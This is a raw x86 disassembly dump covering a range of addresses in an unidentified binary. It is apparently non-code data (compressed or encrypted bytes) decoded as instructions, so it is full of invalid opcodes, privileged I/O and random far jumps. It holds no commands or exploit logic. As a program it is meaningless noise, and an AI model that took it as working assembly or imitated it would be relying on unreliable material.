  42b58b:	pop    ds
  42b58c:	pop    edi
  42b58d:	jns    0x42b5fb
  42b58f:	or     DWORD PTR [edi],ecx
  42b591:	aad    0x1c
  42b593:	inc    ebp
  42b594:	(bad)  
  42b595:	and    bh,cl
  42b597:	adc    eax,0xcaa6d0dc
  42b59c:	mov    eax,0x70b0273d
  42b5a1:	daa    
  42b5a2:	popf   
  42b5a3:	in     eax,dx
  42b5a4:	xchg   ebp,eax
  42b5a5:	or     esi,esi
  42b5a7:	jae    0x42b5ed
  42b5a9:	ins    BYTE PTR es:[edi],dx
  42b5aa:	ficom  DWORD PTR [esi-0x6389556c]
  42b5b0:	mov    BYTE PTR [eax],dh
  42b5b2:	fild   WORD PTR [esi+eax*8-0x5b285253]
  42b5b9:	dec    ebp
  42b5ba:	(bad)  
  42b5bb:	mov    edi,0x2414339c
  42b5c0:	cli    
  42b5c1:	outs   dx,BYTE PTR ds:[esi]
  42b5c2:	mov    edi,0x8778a3e2
  42b5c7:	icebp  
  42b5c8:	jmp    0x42b635
  42b5ca:	or     BYTE PTR [eax+0x746fb2df],bh
  42b5d0:	jo     0x42b57e
  42b5d2:	or     eax,0x434c8904
  42b5d7:	test   BYTE PTR ss:[ebp+0x60ac6ba9],dh
  42b5de:	jae    0x42b5d5
  42b5e0:	int    0xe
  42b5e2:	ret    0x7f67
  42b5e5:	cmc    
  42b5e6:	lods   al,BYTE PTR ds:[esi]
  42b5e7:	sub    al,0xfe
  42b5e9:	xor    eax,0x8dfacc
	...
  42b656:	loopne 0x42b5ec
  42b658:	and    bh,cl
  42b65a:	je     0x42b65b
  42b65c:	out    dx,eax
  42b65d:	mov    edi,0x1397875f
  42b662:	mov    ebx,0x6dd76e73
  42b667:	rol    BYTE PTR [ecx],1
  42b669:	add    bh,bh
  42b66b:	add    BYTE PTR [eax],al
  42b66d:	add    BYTE PTR [ebp+0x72],bh
  42b670:	les    ebx,FWORD PTR [ecx]
  42b672:	xchg   DWORD PTR [edx-0x361220cd],ecx
  42b678:	addr16 call 0x86a1:0x426719d
  42b680:	arpl   WORD PTR gs:[esi-0x48],bx
  42b684:	jbe    0x42b672
  42b686:	push   eax
  42b687:	lods   al,BYTE PTR ds:[esi]
  42b688:	les    esp,FWORD PTR [edi+0x29cac476]
  42b68e:	retf   
  42b68f:	(bad)  
  42b690:	ins    BYTE PTR es:[edi],dx
  42b691:	ins    BYTE PTR es:[edi],dx
  42b692:	jo     0x42b622
  42b694:	push   0xee5898b7
  42b699:	pop    ebx
  42b69a:	jmp    0x6aaef7db
  42b69f:	adc    al,0x10
  42b6a1:	scas   eax,DWORD PTR es:[edi]
  42b6a2:	cld    
  42b6a3:	sbb    BYTE PTR [ecx],bl
  42b6a5:	loope  0x42b674
  42b6a7:	cmp    al,0xbd
  42b6a9:	fmul   QWORD PTR [eax-0x1997fd2b]
  42b6af:	out    dx,al
  42b6b0:	sub    DWORD PTR [ecx],ebp
  42b6b2:	pop    edx
  42b6b3:	aad    0x66
  42b6b5:	dec    edx
  42b6b6:	push   ebp
  42b6b7:	imul   esp,DWORD PTR [esp+ebp*4],0x452a64a8
  42b6be:	in     al,0x4e
  42b6c0:	scas   al,BYTE PTR es:[edi]
  42b6c1:	xor    dh,BYTE PTR [edi]
  42b6c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b6c4:	mov    ah,0x3a
  42b6c6:	xchg   esp,eax
  42b6c7:	gs xchg ebx,eax
  42b6c9:	lahf   
  42b6ca:	in     eax,0x3f
  42b6cc:	pop    esp
  42b6cd:	inc    BYTE PTR [edi-0x36]
  42b6d0:	ret    
  42b6d1:	lods   eax,DWORD PTR ds:[esi]
  42b6d2:	xor    BYTE PTR [ebx+0x4a6f0169],ah
  42b6d8:	nop
  42b6d9:	fstp   DWORD PTR [edx+0x1567dc07]
  42b6df:	xor    eax,0x97ce6484
  42b6e4:	xchg   edx,eax
  42b6e5:	push   esi
  42b6e6:	push   ebp
  42b6e7:	pop    ebx
  42b6e8:	fdivr  QWORD PTR [edx+0x15]
  42b6eb:	(bad)  
  42b6ec:	inc    edi
  42b6ed:	out    dx,al
  42b6ee:	retf   0x63bd
  42b6f1:	aam    0xf8
  42b6f3:	pop    ebx
  42b6f4:	out    0x89,eax
  42b6f6:	xor    al,0xa1
  42b6f8:	jnp    0x42b774
  42b6fa:	leave  
  42b6fb:	mov    esi,0x2829b967
  42b700:	pop    ecx
  42b701:	adc    ecx,DWORD PTR [esi-0xfde495b]
  42b707:	push   edi
  42b708:	lods   al,BYTE PTR ds:[esi]
  42b709:	repz xor eax,0xe32ad393
  42b70f:	pop    edi
  42b710:	fdiv   DWORD PTR [edx-0x2c577075]
  42b716:	arpl   WORD PTR [ecx-0x72b79d0e],dx
  42b71c:	xor    eax,0x1040b3db
  42b721:	loopne 0x42b720
  42b723:	into   
  42b724:	popa   
  42b725:	or     BYTE PTR [ecx-0x5fc1a6e2],ah
  42b72b:	das    
  42b72c:	inc    edx
  42b72d:	sub    DWORD PTR [esi+0x215232e4],edi
  42b733:	push   ds
  42b734:	retf   
  42b735:	in     al,0xc7
  42b737:	or     al,0x71
  42b739:	idiv   BYTE PTR ds:0xc45e1fac
  42b73f:	mov    ch,0x15
  42b741:	call   0x2465:0xeaee7c7c
  42b748:	add    eax,0x5aca164f
  42b74d:	sahf   
  42b74e:	arpl   WORD PTR [ebx],cx
  42b750:	fcomp  QWORD PTR [ebx]
  42b752:	ret    
  42b753:	cmc    
  42b754:	and    ebx,DWORD PTR [edi+0x1111a7ac]
  42b75a:	das    
  42b75b:	out    0x83,eax
  42b75d:	xor    eax,0x90d6980a
  42b762:	inc    edi
  42b763:	pop    ebp
  42b764:	mov    dh,0x5c
  42b766:	(bad)  
  42b767:	jno    0x42b713
  42b769:	push   es
  42b76a:	in     al,0x14
  42b76c:	repz add BYTE PTR [eax],al
	...
  42b7d3:	add    BYTE PTR [eax],al
  42b7d5:	add    BYTE PTR [esi+0x42],cl
  42b7d8:	dec    ecx
  42b7d9:	daa    
  42b7da:	dec    ebp
  42b7db:	das    
  42b7dc:	outs   dx,BYTE PTR ds:[esi]
  42b7dd:	imul   edx,edx,0x63
  42b7e0:	push   ecx
  42b7e1:	xchg   edx,eax
  42b7e2:	jo     0x42b846
  42b7e4:	mov    edi,0x1d16cfe
  42b7e9:	add    bh,bh
  42b7eb:	add    BYTE PTR [eax],al
  42b7ed:	add    BYTE PTR [edi-0x2486abed],ah
  42b7f3:	mov    al,ds:0x70069d6
  42b7f8:	es jmp 0x79e0:0x5315785a
  42b800:	sbb    DWORD PTR [ebx-0x12],esi
  42b803:	popa   
  42b804:	jecxz  0x42b821
  42b806:	mov    BYTE PTR ds:[esi-0x77],cl
  42b80a:	mov    bl,BYTE PTR ds:0x3568a6bc
  42b810:	hlt    
  42b811:	int    0x36
  42b813:	loope  0x42b876
  42b815:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b816:	in     eax,0x1f
  42b818:	aas    
  42b819:	ja     0x42b7ad
  42b81b:	jmp    0x5a59:0xe6d81c39
  42b822:	das    
  42b823:	ins    DWORD PTR es:[edi],dx
  42b824:	in     al,dx
  42b825:	adc    DWORD PTR [ebp-0x5377ebb8],eax
  42b82b:	adc    BYTE PTR [esp+ecx*8+0x114a74c3],cl
  42b832:	outs   dx,BYTE PTR ds:[esi]
  42b833:	xlat   BYTE PTR ds:[ebx]
  42b834:	jnp    0x42b881
  42b836:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b837:	sbb    ch,0xdf
  42b83a:	fcom   DWORD PTR [eax+0x3766eb5c]
  42b840:	inc    DWORD PTR [edi+0x7b1cdaaf]
  42b846:	je     0x42b7ea
  42b848:	(bad)  
  42b84a:	push   eax
  42b84b:	adc    ch,dh
  42b84d:	mov    BYTE PTR [ebx+edi*8-0x36755af0],0xf4
  42b855:	mov    bh,0x8c
  42b857:	xchg   edx,eax
  42b858:	mov    WORD PTR [ebx+0x30],es
  42b85b:	(bad)  
  42b85c:	mov    esi,0x240289db
  42b861:	jo     0x42b853
  42b863:	retf   
  42b864:	inc    edi
  42b865:	mov    ebx,0xfb50fa47
  42b86a:	mov    dh,0x1
  42b86c:	fdiv   st,st(0)
  42b86e:	jbe    0x42b8a1
  42b870:	popf   
  42b871:	ror    DWORD PTR [edi],0xf9
  42b874:	pop    ebx
  42b875:	sbb    BYTE PTR [ebp-0x24],dl
  42b878:	and    BYTE PTR [edx],dl
  42b87a:	mov    bh,0x14
  42b87c:	adc    al,0x85
  42b87e:	popa   
  42b87f:	sti    
  42b880:	sahf   
  42b881:	jbe    0x42b899
  42b883:	cmc    
  42b884:	push   ebp
  42b885:	out    0x56,al
  42b887:	fs push cs
  42b889:	mov    ah,0xa8
  42b88b:	es int 0xe2
  42b88e:	mov    ds:0x76c53c89,al
  42b893:	adc    BYTE PTR [eax-0x5822fc45],ah
  42b899:	pop    ebx
  42b89a:	mov    cl,0xb1
  42b89c:	mov    ebx,esi
  42b89e:	pop    ebp
  42b89f:	outs   dx,BYTE PTR ds:[esi]
  42b8a0:	fs xchg ebx,eax
  42b8a2:	cmp    ecx,0xffffffe4
  42b8a5:	icebp  
  42b8a6:	dec    eax
  42b8a7:	push   edx
  42b8a8:	rcl    bl,1
  42b8aa:	jns    0x42b8f0
  42b8ac:	pushf  
  42b8ad:	mov    dl,0x4f
  42b8af:	xor    al,0x6f
  42b8b1:	add    ecx,0x15
  42b8b4:	call   0xbb38:0x2b5058c7
  42b8bb:	data16 sub bh,al
  42b8be:	pop    ds
  42b8bf:	or     bh,0xf
  42b8c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b8c3:	repnz mov edi,0xfdd31acb
  42b8c9:	jmp    0x42b868
  42b8cb:	loop   0x42b8db
  42b8cd:	xchg   esp,eax
  42b8ce:	or     al,0xa8
  42b8d0:	jb     0x42b8c8
  42b8d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b8d3:	imul   eax,DWORD PTR [ecx],0x68
  42b8d6:	pop    ecx
  42b8d7:	jno    0x42b880
  42b8d9:	lds    ebx,FWORD PTR [esi+0x56]
  42b8dc:	push   ds
  42b8dd:	cmp    eax,0xe54ad5cc
  42b8e2:	cwde   
  42b8e3:	stos   BYTE PTR es:[edi],al
  42b8e4:	popf   
  42b8e5:	call   0x893b:0x67f5e714
  42b8ec:	xchg   edi,eax
	...
  42b955:	add    al,ch
  42b957:	popf   
  42b958:	mov    esi,0xf9e7ffe7
  42b95d:	lahf   
  42b95e:	ret    0x608c
  42b961:	or     esp,DWORD PTR [edi+0x6bee6d0d]
  42b967:	rol    BYTE PTR [ecx],cl
  42b969:	add    bh,bh
  42b96b:	add    BYTE PTR [eax],al
  42b96d:	add    BYTE PTR [esi],dh
  42b96f:	fnsave [esp+eax*2]
  42b972:	cs call 0xffa3:0x320c0dc1
  42b97a:	ffree  st(6)
  42b97c:	or     dh,BYTE PTR [ebp+ebp*2+0x19415e97]
  42b983:	stos   BYTE PTR es:[edi],al
  42b984:	bound  edi,QWORD PTR [ebx-0x2f187c29]
  42b98a:	sub    DWORD PTR [ecx-0x23],esi
  42b98d:	(bad)  [esi-0x523d471c]
  42b993:	sbb    ecx,DWORD PTR [edi-0x1bcb3c33]
  42b999:	xor    eax,0x9e052c25
  42b99e:	into   
  42b99f:	and    BYTE PTR [eax+0x5d760c0b],bh
  42b9a5:	test   eax,0xbb3b485b
  42b9aa:	cs mov ecx,0x13314abb
  42b9b0:	xlat   BYTE PTR ds:[ebx]
  42b9b1:	add    bl,BYTE PTR [esi]
  42b9b3:	aas    
  42b9b4:	(bad)  
  42b9b5:	rcl    BYTE PTR ds:0x90890ca6,cl
  42b9bb:	in     al,0xfd
  42b9bd:	loope  0x42b99c
  42b9bf:	adc    eax,0xc869c7ab
  42b9c4:	shl    DWORD PTR [ebx-0x39],0xe7
  42b9c8:	adc    BYTE PTR [ebx],ah
  42b9ca:	xchg   edx,eax
  42b9cb:	add    al,0xfd
  42b9cd:	add    esi,ebp
  42b9cf:	pop    es
  42b9d0:	repnz lds esi,FWORD PTR [edx+0x19]
  42b9d4:	dec    ebp
  42b9d5:	in     al,dx
  42b9d6:	mov    eax,ds:0x96878e27
  42b9db:	pop    es
  42b9dc:	unpcklps xmm7,XMMWORD PTR [eax+0x70aa9d80]
  42b9e3:	fisub  WORD PTR [esi-0x49]
  42b9e6:	shl    BYTE PTR [edi+eiz*8-0x2],1
  42b9ea:	inc    ebp
  42b9eb:	inc    ebx
  42b9ec:	add    edx,0x73
  42b9ef:	or     ebp,eax
  42b9f1:	xlat   BYTE PTR ds:[ebx]
  42b9f2:	outs   dx,BYTE PTR ds:[esi]
  42b9f3:	sub    al,BYTE PTR [edi]
  42b9f5:	je     0x42ba6e
  42b9f7:	popf   
  42b9f8:	inc    esp
  42b9f9:	jecxz  0x42ba36
  42b9fb:	xor    DWORD PTR [ebp+0x19],ebp
  42b9fe:	mov    bh,0xd5
  42ba00:	rcr    al,0xb2
  42ba03:	stc    
  42ba04:	xchg   BYTE PTR [esi+0x2d12efce],ch
  42ba0a:	push   es
  42ba0b:	mov    edx,0x56947fa9
  42ba10:	add    BYTE PTR [ebx+0x18],ah
  42ba13:	sbb    al,0xc7
  42ba15:	fidivr DWORD PTR [ecx-0x3c9c0580]
  42ba1b:	lods   al,BYTE PTR ds:[esi]
  42ba1c:	cli    
  42ba1d:	xor    eax,0xe184a52
  42ba22:	out    dx,al
  42ba23:	push   DWORD PTR gs:[ecx+esi*2-0x30a3a342]
  42ba2b:	popf   
  42ba2c:	add    BYTE PTR [edx],bl
  42ba2e:	sbb    edx,DWORD PTR [ecx]
  42ba30:	sahf   
  42ba31:	jl     0x42ba24
  42ba33:	fwait
  42ba34:	imul   edi,esi,0x54929b8e
  42ba3a:	imul   BYTE PTR [esi+eax*1+0x58c6a0ba]
  42ba41:	xor    al,0xc0
  42ba43:	cmp    al,0xe6
  42ba45:	stc    
  42ba46:	lea    eax,[eax-0x26]
  42ba49:	fnstsw WORD PTR [esi-0x6cf9931a]
  42ba4f:	aad    0x4e
  42ba51:	cs in  al,dx
  42ba53:	sub    BYTE PTR [ebp+0x32],bh
  42ba56:	push   ebx
  42ba57:	push   ecx
  42ba58:	pop    edx
  42ba59:	clc    
  42ba5a:	xor    DWORD PTR [ebx],edx
  42ba5c:	dec    ebx
  42ba5d:	mov    ds:0xb05049ba,eax
  42ba62:	push   es
  42ba63:	mov    ecx,0x55c5b05
  42ba68:	aas    
  42ba69:	jmp    0x8edde4
	...
  42bad6:	mov    eax,DWORD PTR [edi]
  42bad8:	mov    al,0xe2
  42bada:	mov    esp,0x6a6fdbf7
  42badf:	pop    ebx
  42bae0:	xchg   ecx,eax
  42bae1:	or     DWORD PTR [eax-0x5f],ebx
  42bae4:	imul   edi,DWORD PTR [eax+0x1d36a],0xffffffff
  42baeb:	add    BYTE PTR [eax],al
  42baed:	add    BYTE PTR [esi+0x4b],cl
  42baf0:	mov    esi,0x755d0b85
  42baf6:	inc    edx
  42baf7:	stos   DWORD PTR es:[edi],eax
  42baf8:	shl    BYTE PTR [ebp+0x26353405],0x86
  42baff:	push   ds
  42bb00:	ss push ds
  42bb02:	pop    ecx
  42bb03:	adc    BYTE PTR [edx],ah
  42bb05:	pop    edx
  42bb06:	cwde   
  42bb07:	mov    al,ch
  42bb09:	pop    edi
  42bb0a:	imul   eax,DWORD PTR ds:0xeb04a547,0x900b53b4
  42bb14:	sub    eax,0xdd79e9a
  42bb19:	(bad)  
  42bb1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bb1b:	pushf  
  42bb1c:	xor    DWORD PTR ds:0x7b82f9b0,ecx
  42bb22:	in     al,dx
  42bb23:	retf   
  42bb24:	je     0x42bad7
  42bb26:	jmp    0xcba6db2f
  42bb2b:	cld    
  42bb2c:	js     0x42bb89
  42bb2e:	repz out 0x60,eax
  42bb31:	mov    dh,0xf3
  42bb33:	mov    ds:0x1b97062e,al
  42bb38:	mov    eax,cs:0x22a04b76
  42bb3e:	cmp    eax,0xa96dd4a5
  42bb43:	mov    eax,0x3f2d61b8
  42bb48:	mov    ebp,0xdba830e0
  42bb4d:	dec    edi
  42bb4e:	sub    ch,BYTE PTR [ebx+ebp*8+0x57]
  42bb52:	fild   QWORD PTR [ecx+0x21]
  42bb55:	in     eax,0xf4
  42bb57:	push   eax
  42bb58:	xchg   BYTE PTR [esi-0x4c7dcc48],dl
  42bb5e:	scas   eax,DWORD PTR es:[edi]
  42bb5f:	xchg   DWORD PTR [ecx],ebp
  42bb61:	cld    
  42bb62:	inc    esp
  42bb63:	adc    esp,DWORD PTR [ebx-0x26]
  42bb66:	xor    al,0x34
  42bb68:	mov    esp,cs
  42bb6a:	jno    0x42bb16
  42bb6c:	mov    ah,0xb3
  42bb6e:	repnz iret 
  42bb70:	enter  0x456f,0x77
  42bb74:	das    
  42bb75:	mov    ebp,0x147d8ab2
  42bb7a:	rcl    BYTE PTR ds:0xa2ba2bf8,1
  42bb80:	neg    esi
  42bb82:	cmp    edi,DWORD PTR [eax+0x3c]
  42bb85:	and    bl,ah
  42bb87:	jns    0x42bbb9
  42bb89:	xchg   DWORD PTR ds:0x6e73ce14,edi
  42bb8f:	xor    al,0xd3
  42bb91:	sbb    eax,0x176aac6a
  42bb96:	add    al,0xbb
  42bb98:	xor    bl,BYTE PTR [ebp-0x279c28a0]
  42bb9e:	test   al,0x60
  42bba0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bba1:	mov    ds:0x25e2a6d3,eax
  42bba6:	push   edi
  42bba7:	(bad)  
  42bba9:	push   esp
  42bbaa:	sti    
  42bbab:	cdq    
  42bbac:	xor    BYTE PTR [edx-0x364c2d72],dl
  42bbb2:	rol    BYTE PTR [ebx+0x3e345d27],1
  42bbb8:	pop    ds
  42bbb9:	in     eax,0xb0
  42bbbb:	xor    eax,DWORD PTR [ebx]
  42bbbd:	add    BYTE PTR [esi+0x2a],bh
  42bbc0:	ficom  DWORD PTR [ecx+0x5eab80fc]
  42bbc6:	scas   eax,DWORD PTR es:[edi]
  42bbc7:	cmp    bl,bh
  42bbc9:	(bad)  
  42bbca:	push   0x7e53868b
  42bbcf:	int3   
  42bbd0:	into   
  42bbd1:	scas   al,BYTE PTR es:[edi]
  42bbd2:	dec    ebx
  42bbd3:	nop
  42bbd4:	xchg   ebx,eax
  42bbd5:	xor    al,0x44
  42bbd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bbd8:	test   al,0x6c
  42bbda:	cs add al,0x4c
  42bbdd:	mov    gs,WORD PTR [eax+0x586b3a67]
  42bbe3:	out    dx,al
  42bbe4:	push   eax
  42bbe5:	mov    cl,0xfa
  42bbe7:	scas   al,BYTE PTR es:[edi]
  42bbe8:	scas   eax,DWORD PTR es:[edi]
  42bbe9:	inc    edx
  42bbea:	cmp    edi,DWORD PTR [ecx]
  42bbec:	sub    DWORD PTR [eax],eax
	...
  42bc56:	xor    al,0x28
  42bc58:	add    DWORD PTR [esi],eax
  42bc5a:	sbb    eax,0x233a372f
  42bc5f:	sub    DWORD PTR [ebx],eax
  42bc61:	dec    ecx
  42bc62:	shl    ch,cl
  42bc64:	and    cl,bl
  42bc66:	imul   edx,esp,0xff0001
  42bc6c:	add    BYTE PTR [eax],al
  42bc6e:	xlat   BYTE PTR ds:[ebx]
  42bc6f:	mov    ah,0x27
  42bc71:	ins    DWORD PTR es:[edi],dx
  42bc72:	add    BYTE PTR [eax+0x5f],bh
  42bc75:	sbb    eax,0x2be4b373
  42bc7a:	je     0x42bcba
  42bc7c:	fstp   DWORD PTR [ebx]
  42bc7e:	test   DWORD PTR [eax+0x1b9641c6],eax
  42bc84:	daa    
  42bc85:	push   edx
  42bc86:	call   0x8ef3ee3
  42bc8b:	dec    esi
  42bc8c:	pop    edi
  42bc8d:	pop    edx
  42bc8e:	mov    ebx,0x39f13ba
  42bc93:	mov    esp,0x66204134
  42bc98:	pop    ebx
  42bc99:	fnsave [ebx]
  42bc9b:	jns    0x42bc73
  42bc9d:	test   ebp,esp
  42bc9f:	repz call 0x8d4586ea
  42bca5:	mov    esi,0xa644233
  42bcaa:	shr    ecx,cl
  42bcac:	sahf   
  42bcad:	push   esi
  42bcae:	repnz or cl,dl
  42bcb1:	add    bl,dh
  42bcb3:	ret    
  42bcb4:	inc    esp
  42bcb5:	add    esp,0xffffffa2
  42bcb8:	push   edi
  42bcb9:	test   BYTE PTR [ecx],dl
  42bcbb:	xor    BYTE PTR [edx],dl
  42bcbd:	stos   BYTE PTR es:[edi],al
  42bcbe:	adc    esi,DWORD PTR [eax+0x439b9967]
  42bcc4:	popf   
  42bcc5:	in     eax,dx
  42bcc6:	fisubr WORD PTR [esi]
  42bcc8:	inc    DWORD PTR [edx]
  42bcca:	mov    ecx,0xf9538cd7
  42bccf:	xor    ecx,ebx
  42bcd1:	jle    0x42bc71
  42bcd3:	add    dh,BYTE PTR [esp+eax*2]
  42bcd6:	or     edx,DWORD PTR ds:0x34f4b202
  42bcdc:	pop    ebx
  42bcdd:	imul   eax,DWORD PTR [eax+0x5d],0x37
  42bce1:	xlat   BYTE PTR ds:[ebx]
  42bce2:	and    al,0xde
  42bce4:	xchg   esp,eax
  42bce5:	shl    ebp,1
  42bce7:	pop    esi
  42bce8:	ret    
  42bce9:	or     al,0xf5
  42bceb:	pop    es
  42bcec:	imul   ebx,DWORD PTR [edx-0x4b],0x4e8c9bc9
  42bcf3:	cli    
  42bcf4:	stc    
  42bcf5:	iret   
  42bcf6:	in     eax,0x21
  42bcf8:	mov    al,0x9c
  42bcfa:	out    dx,eax
  42bcfb:	jns    0x42bd65
  42bcfd:	cmp    ch,BYTE PTR [edx+0x50]
  42bd00:	call   0xe8dc263
  42bd05:	jo     0x42bd7e
  42bd07:	and    cl,0x98
  42bd0a:	popa   
  42bd0b:	ror    BYTE PTR [edi-0x7],0xdf
  42bd0f:	inc    bx
  42bd11:	inc    esi
  42bd12:	test   al,0xf5
  42bd14:	ret    
  42bd15:	adc    ah,BYTE PTR [esi+0x4e1ab60a]
  42bd1b:	cmp    DWORD PTR [ecx+0x2e95198],0x5223d995
  42bd25:	(bad)  
  42bd27:	sbb    eax,0xb994dadc
  42bd2c:	jge    0x42bd5e
  42bd2e:	aad    0x59
  42bd30:	xlat   BYTE PTR ds:[ebx]
  42bd31:	adc    eax,0xf96b71c9
  42bd36:	push   ebp
  42bd37:	xor    al,0x65
  42bd39:	dec    esi
  42bd3a:	fsubr  DWORD PTR [edx]
  42bd3c:	cmp    bh,BYTE PTR [eax-0x3697f651]
  42bd42:	rcr    al,cl
  42bd44:	sar    cl,1
  42bd46:	retf   0xc8ae
  42bd49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bd4a:	dec    eax
  42bd4b:	dec    edi
  42bd4c:	mov    ah,0x60
  42bd4e:	cmp    ah,ah
  42bd50:	pop    edi
  42bd51:	shl    DWORD PTR [ebp+0x202b2472],cl
  42bd57:	pop    ss
  42bd58:	leave  
  42bd59:	loop   0x42bd1d
  42bd5b:	ins    DWORD PTR es:[edi],dx
  42bd5c:	stos   BYTE PTR es:[edi],al
  42bd5d:	repnz mov DWORD PTR [eax+0x29a15475],eax
  42bd64:	scas   al,BYTE PTR es:[edi]
  42bd65:	pop    es
  42bd66:	jb     0x42bd02
  42bd68:	sub    ah,0xea
  42bd6b:	cld    
  42bd6c:	sbb    al,0x0
	...
  42bdd6:	mov    al,0xb6
  42bdd8:	pushf  
  42bdd9:	adc    al,0x9e
  42bddb:	ds mov eax,0xffec3b6
  42bde1:	jae    0x42bdcf
  42bde3:	cli    
  42bde4:	lods   al,BYTE PTR ds:[esi]
  42bde5:	mov    ebp,DWORD PTR [eax-0x2b]
  42bde8:	add    DWORD PTR [eax],eax
  42bdea:	inc    DWORD PTR [eax]
  42bdec:	add    BYTE PTR [eax],al
  42bdee:	and    edi,edi
  42bdf0:	xor    ebx,edi
  42bdf2:	mov    eax,ds:0xdb32edc5
  42bdf7:	push   0xffffff9d
  42bdf9:	push   ds
  42bdfa:	jg     0x42be45
  42bdfc:	push   esi
  42bdfd:	xchg   ch,ch
  42bdff:	das    
  42be00:	or     al,0xba
  42be02:	jbe    0x42bd85
  42be04:	std    
  42be05:	dec    esi
  42be06:	push   eax
  42be07:	dec    ebp
  42be08:	test   DWORD PTR [edi+0x7fa354f0],edx
  42be0e:	dec    edi
  42be0f:	test   eax,0x95d30fc5
  42be14:	test   BYTE PTR [eax-0x41],al
  42be17:	shr    edi,1
  42be19:	std    
  42be1a:	fidivr DWORD PTR [esi]
  42be1c:	add    al,0x90
  42be1e:	xchg   BYTE PTR [edx-0x3d320ccf],bh
  42be24:	mov    dh,0xb0
  42be26:	(bad)  
  42be28:	push   ecx
  42be29:	xor    ecx,DWORD PTR [esi+ebp*1+0x65]
  42be2d:	add    ch,BYTE PTR [edx]
  42be2f:	int    0xa2
  42be31:	inc    edi
  42be32:	loope  0x42be73
  42be34:	sbb    ebx,DWORD PTR [si]
  42be37:	xor    ebx,DWORD PTR [ebx-0x33]
  42be3a:	push   es
  42be3b:	fmul   QWORD PTR [esi]
  42be3d:	dec    esp
  42be3e:	mov    ebp,0xa481852
  42be43:	faddp  st(1),st
  42be45:	jl     0x42beb0
  42be47:	cmp    BYTE PTR [eax-0x7c],0xa5
  42be4b:	cmp    eax,0x208d4277
  42be50:	jp     0x42be87
  42be52:	icebp  
  42be53:	cdq    
  42be54:	retf   
  42be55:	and    edi,DWORD PTR ds:0x5a1e3342
  42be5b:	or     ah,BYTE PTR [edx]
  42be5d:	push   cs
  42be5e:	or     DWORD PTR ds:0x7ac0e0bd,esi
  42be64:	jle    0x42be14
  42be66:	stos   DWORD PTR es:[edi],eax
  42be67:	mov    eax,ds:0x17730825
  42be6c:	or     BYTE PTR [eax+0x29],0xb
  42be70:	loop   0x42be5b
  42be72:	inc    ebx
  42be73:	repnz push edi
  42be75:	xchg   edi,eax
  42be76:	loopne 0x42be8f
  42be78:	bound  ebp,QWORD PTR [eax+ecx*4-0x1811357]
  42be7f:	inc    edi
  42be80:	in     al,dx
  42be81:	jno    0x42be4f
  42be83:	push   edx
  42be84:	jp     0x42be08
  42be86:	iret   
  42be87:	out    dx,al
  42be88:	pop    es
  42be89:	in     eax,0xbd
  42be8b:	lods   eax,DWORD PTR ds:[esi]
  42be8c:	gs leave 
  42be8e:	iret   
  42be8f:	in     eax,0x70
  42be91:	loopne 0x42be31
  42be93:	sahf   
  42be94:	xor    esp,ecx
  42be96:	mov    esp,0x52c58014
  42be9b:	shl    ebx,1
  42be9d:	test   BYTE PTR [esi+0x47],al
  42bea0:	test   al,0x1
  42bea2:	push   edx
  42bea3:	mov    eax,ds:0x8a42fce2
  42bea8:	mov    ?,eax
  42beaa:	outs   dx,DWORD PTR ds:[esi]
  42beab:	popf   
  42beac:	pop    es
  42bead:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42beae:	cs jg  0x42bf14
  42beb1:	and    BYTE PTR ds:0x561fa9cf,dl
  42beb7:	fucom  st(4)
  42beb9:	and    dl,BYTE PTR [edi+eiz*8-0x4e8ae6f0]
  42bec0:	daa    
  42bec1:	fs gs loope 0x42be85
  42bec5:	shl    DWORD PTR [edx-0xcc35746],1
  42becb:	jo     0x42be81
  42becd:	xor    edx,esi
  42becf:	xchg   BYTE PTR [ebx+0x37],ah
  42bed2:	mov    esi,0xc84107a6
  42bed7:	and    DWORD PTR [eax+0x69],esi
  42beda:	xchg   esp,eax
  42bedb:	inc    ebp
  42bedc:	adc    ebx,DWORD PTR [eax]
  42bede:	fmul   QWORD PTR [edx]
  42bee0:	add    al,BYTE PTR ds:0x223e8e84
  42bee6:	push   0x56
  42bee8:	sti    
  42bee9:	es jl  0x42be73
  42beec:	lock add BYTE PTR [eax],al
	...
  42bf53:	add    BYTE PTR [eax],al
  42bf55:	add    BYTE PTR [edi-0x825b8e0],dl
  42bf5b:	call   FWORD PTR [edi-0x28375c93]
  42bf61:	jnp    0x42bfdc
  42bf63:	lahf   
  42bf64:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bf66:	addr16 (bad) 
  42bf68:	add    DWORD PTR [eax],eax
  42bf6a:	inc    DWORD PTR [eax]
  42bf6c:	add    BYTE PTR [eax],al
  42bf6e:	xchg   ecx,eax
  42bf6f:	xchg   ecx,eax
  42bf70:	xchg   ecx,eax
  42bf71:	mov    ax,0x1149
  42bf75:	sahf   
  42bf76:	cmc    
  42bf77:	(bad)  
  42bf78:	and    ecx,DWORD PTR ds:0x53c60e7
  42bf7e:	jno    0x42bf8b
  42bf80:	jl     0x42bf88
  42bf82:	fcmovnb st,st(2)
  42bf84:	push   esp
  42bf85:	mov    bh,0xd0
  42bf87:	hlt    
  42bf88:	(bad)  
  42bf89:	xor    edx,esp
  42bf8b:	(bad)  [ecx+0x77963dcb]
  42bf91:	jne    0x42bfd2
  42bf93:	out    0xb3,eax
  42bf95:	outs   dx,DWORD PTR ds:[esi]
  42bf96:	jecxz  0x42bfe4
  42bf98:	mov    ecx,0x8e8e979a
  42bf9d:	adc    al,0xa5
  42bf9f:	pop    ecx
  42bfa0:	xor    BYTE PTR [ebx-0x35c44fcc],dh
  42bfa6:	add    eax,0x7709c871
  42bfab:	test   eax,0xf9e61d8b
  42bfb0:	aad    0x4c
  42bfb2:	add    al,0x38
  42bfb4:	push   esp
  42bfb5:	mov    ebp,0xcdcf63f5
  42bfba:	fist   DWORD PTR [ebx+edx*4]
  42bfbd:	clc    
  42bfbe:	into   
  42bfbf:	mov    eax,ds:0x4a1ae3b0
